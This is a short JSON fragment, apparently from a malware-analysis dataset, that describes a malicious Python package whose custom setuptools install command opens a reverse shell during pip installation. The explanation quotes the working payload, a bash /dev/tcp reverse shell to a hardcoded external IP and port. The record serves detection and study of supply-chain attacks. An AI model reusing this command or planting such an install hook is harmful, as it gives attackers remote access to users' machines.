      "malicious_behavior": "This code is malicious. It defines a custom setuptools install command (CustomInstallCommand) that, when the package is installed (e.g., via pip), executes a shell command to open a reverse shell to a hardcoded external IP address (114.116.119.253) on port 7888. The command 'bash -c 'bash -i >& /dev/tcp/114.116.119.253/7888 <&1'' is a classic reverse shell payload, which gives an attacker remote access to the victim's system. This is executed automatically during package installation, without user consent or notification, and is a hallmark of supply chain attacks in Python ecosystems. The use of a custom install hook to execute arbitrary shell commands, especially those establishing outbound connections to untrusted IPs, is exclusively observed in malware and is never justified in benign software.",
